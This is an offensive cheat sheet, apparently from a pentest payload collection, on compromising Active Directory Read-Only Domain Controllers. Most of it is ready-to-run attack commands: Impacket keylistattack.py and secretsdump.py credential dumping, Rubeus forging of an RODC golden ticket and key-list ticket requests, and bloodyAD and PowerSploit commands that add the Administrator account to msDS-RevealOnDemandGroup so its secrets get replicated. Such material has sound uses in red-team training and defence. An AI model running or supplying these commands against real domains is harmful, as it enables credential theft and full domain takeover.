# Active Directory - Read Only Domain Controller

RODCs are an alternative for Domain Controllers in less secure physical locations
- Contains a filtered copy of AD (LAPS and Bitlocker keys are excluded)
- Any user or group specified in the **managedBy** attribute of an RODC has local admin access to the RODC server


## RODC Golden Ticket

* You can forge an RODC golden ticket and present it to a writable Domain Controller only for principals listed in the RODC’s **msDS-RevealOnDemandGroup** attribute and not in the RODC’s **msDS-NeverRevealGroup** attribute


## RODC Key List Attack

**Requirements**:

* [Impacket PR #1210 - The Kerberos Key List Attack](https://github.com/SecureAuthCorp/impacket/pull/1210)
* **krbtgt** credentials of the RODC (-rodcKey) 
* **ID of the krbtgt** account of the RODC (-rodcNo)


**Exploit**:

* using Impacket
  ```ps1
  # keylistattack.py using SAMR user enumeration without filtering (-full flag)
  keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full

  # keylistattack.py defining a target username (-t flag)
  keylistattack.py -kdc server.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST

  # secretsdump.py using the Kerberos Key List Attack option (-use-keylist)
  secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist
  ```
* Using Rubeus
  ```ps1
  Rubeus.exe golden /rodcNumber:25078 /aes256:eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 /user:admin /id:1136 /domain:lab.local /sid:S-1-5-21-1437000690-1664695696-1586295871
  Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/lab.local /dc:dc1.lab.local /ticket:doIFgzCC[...]wIBBxhYnM=
  ```


## RODC Computer Object

When you have one the following permissions to the RODC computer object: **GenericWrite**, **GenericAll**, **WriteDacl**, **Owns**, **WriteOwner**, **WriteProperty**.

* Add a domain admin account to the RODC's **msDS-RevealOnDemandGroup** attribute
  * Windows/Linux:
    ```ps1
    # Get original msDS-RevealOnDemandGroup values 
    bloodyAD --host 10.10.10.10 -d domain.local -u username -p pass123 get object 'RODC$' --attr msDS-RevealOnDemandGroup
    distinguishedName: CN=RODC,CN=Computers,DC=domain,DC=local
    msDS-RevealOnDemandGroup: CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local
    # Add the previous value plus the admin account
    bloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 set object 'RODC$' --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'
    ```
  * Windows only:
  ```ps1
  PowerSploit> Set-DomainObject -Identity RODC$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}
  ```


## References

* [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf](https://adsecurity.org/?p=3592)
* [At the Edge of Tier Zero: The Curious Case of the RODC - Elad Shamir](https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06)
* [The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)
